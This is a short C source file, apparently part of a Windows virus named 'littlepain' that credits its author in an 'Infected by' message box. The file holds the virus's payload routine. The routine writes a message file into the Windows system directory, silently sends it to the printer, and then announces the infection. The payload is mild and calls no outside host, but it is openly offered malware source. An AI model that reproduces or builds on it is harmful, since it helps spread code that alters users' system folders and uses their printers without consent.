#include "littlepain.h"

/* This function will print a MsG as payload :) */
void Payload(void)
{
	char flag_path[MAX_PATH];
	HANDLE flag_fd;
	DWORD written;

	/* Write file with msg in windows folder */
	GetWindowsDirectory(flag_path,MAX_PATH);
    strcat(flag_path,"\\MSG_FOR_YOU.txt");

	flag_fd = CreateFile(flag_path,GENERIC_WRITE,FILE_SHARE_WRITE,
		NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);

	if(flag_fd != INVALID_HANDLE_VALUE)
	{
		WriteFile(flag_fd,"Dear user, your system needs some security improvements!",
			56,&written,NULL);
		CloseHandle(flag_fd);
		/* print MsG! */
		ShellExecute(NULL,"print",flag_path,NULL,NULL,SW_HIDE);
	    /* display an other msg */
		MessageBox(NULL,"Infected by littlepain by [WarGame,#eof] ( italian guy )","Credits",
			MB_OK|MB_ICONINFORMATION);
	}
}